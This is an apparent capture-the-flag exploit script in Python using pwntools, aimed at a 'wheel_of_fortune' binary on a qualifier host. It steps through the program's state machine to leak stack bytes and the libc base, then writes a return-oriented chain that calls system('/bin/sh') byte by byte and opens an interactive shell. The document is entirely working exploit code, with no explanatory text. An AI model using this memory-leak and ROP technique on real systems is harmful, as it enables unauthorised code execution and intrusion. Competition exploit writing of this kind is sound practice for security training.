from pwn import *


# r = process('./wheel_of_fortune')
r = remote('eofqual.zoolab.org', 10102)
# r = remote("localhost", 10101)

libc_offset = 0x270b3
libc_pointer_pos = 0x418
PIE_base = 0
PIE_offset = 0x18f0
canary = 0x898 - 0x4B0
main_offset = 0x18be
libc_base = 0

def phase1():
    global libc_offset, libc_pointer_pos, PIE_base, PIE_offset, canary, main_offset, libc_base
    fortune = (1 << 3) + (1 << 8) + (1 << 14) + (1 << 19)
    r.sendlineafter('fortune : ', str(fortune))

    buf = [0 for i in range(256)]
    pos = 0
    bit = 0
    state = 0
    idx = 0

    expected = [7, 6, 4, 1, 0, 7, 6, 1, 2, 1, 0]
    exp_ptr = 0
    cur_byte = -1
    prev_state = -1

    recover = True

    it = 0

    last_leak = -1
    last_leak_byte = -1

    write_back = False
    want_to_quit = False

    overwrite = -1
    cnt_overwrite = 0
    rbp = 0

    pop_rdi = 0x0026b72 + libc_base
    binsh = 0x001b75aa + libc_base
    system = 0x055410 + libc_base
    ret = 0x025679 + libc_base


    while bit < 32:
        it += 1
        if fortune >> bit & 1: 
            state = (state + 1) % 8
        else:
            state = (state + 7) % 8
        buf[idx] = state
        # assert want_to_quit or state == expected[exp_ptr] or state == 5

        if pos % 100 == 0:
            print(pos)
        
        tmp = state

        if state == 0:
            pos -= 1
        elif state == 1:
            cur_byte = -1
            pos += 1
        elif state == 2:
            pass
        elif state == 3:
            pass
        elif state == 4:
            # assert not want_to_quit
            # assert cur_byte != -1
            idx = (idx + 256 - cur_byte) % 256
            # assert buf[idx] == 4
            state = buf[idx]
            # assert bit >= cur_byte
            bit -= cur_byte
        elif state == 5:
            # assert want_to_quit or expected[exp_ptr] == 4 or expected[exp_ptr] == 1
            to = expected[exp_ptr]
            if want_to_quit:
                to = 1
            if to == 4:
                r.sendlineafter('number : ', str(0))
            else:
                r.sendlineafter('number : ', str(2))
            state = to
            buf[idx] = state
            if state == 1:
                pos += 1
            else:
                # assert cur_byte != -1
                idx = (idx + 256 - cur_byte) % 256
                # assert want_to_quit or buf[idx] == 4
                state = buf[idx]
                bit -= cur_byte
        elif state == 6:
            if recover:
                # assert want_to_quit or bit == 1 or bit == 12
                if bit == 12:
                    r.sendafter('token : ', int.to_bytes(11, 1, 'little'))
                    cur_byte = 11
                else:
                    r.sendafter('token : ', b'\x00')
                    cur_byte = 0
            else:
                write_byte = 0
                if pos >= canary + 0x30 and pos < canary + 0x38:
                    nbit = 8 * (pos - canary - 0x30 + 1)
                    libc_real = libc_base - (libc_offset & ((1 << nbit) - 1))
                    libc_real += (pop_rdi & ((1 << nbit) - 1))
                    libc_real >>= (nbit - 8)
                    write_byte = libc_real
                elif pos >= canary + 0x38 and pos < canary + 0x40:
                    write_byte = binsh & 0xff
                    binsh >>= 8
                elif pos >= canary + 0x40 and pos < canary + 0x48:
                    write_byte = ret & 0xff
                    ret >>= 8
                elif pos >= canary + 0x48 and pos < canary + 0x50:
                    write_byte = system & 0xff
                    system >>= 8
                elif not write_back:
                    write_byte = 0
                else:
                    write_byte = last_leak_byte
                if write_byte < 0:
                    write_byte = 255
                # assert write_byte != 10
                r.sendafter('token : ', int.to_bytes(write_byte, 1, 'little'))
                cur_byte = 0
                if pos == canary + 0x4f:
                    want_to_quit = True
            recover = not recover
        elif state == 7:
            if last_leak != pos:
                r.recvuntil(b'\xc6\x92 ')
                cur_byte = u64(r.recv(1) + b'\x00' * 7) - 1
                if cur_byte < 0:
                    cur_byte = 255
                last_leak_byte = cur_byte
                if pos >= canary:
                    write_back = True
                if pos >= canary + 0x30 and pos < canary + 0x38: # libc
                    libc_base |= (cur_byte << (8 * (pos - canary - 0x30)))
                if pos == canary + 0x37:
                    libc_base -= libc_offset
                    print(hex(libc_base))
                    print(hex(PIE_base))
                    # want_to_quit = True
                    # pop_rdi += libc_base
                    binsh += libc_base
                    ret += libc_base
                    system += libc_base
                last_leak = pos
                r.recvuntil(b'\xc6\x92\n')

        idx = (idx + 1) % 256
        bit += 1
        exp_ptr = (exp_ptr + 1) % len(expected)
        prev_state = tmp

phase1()
# phase2()
r.interactive()
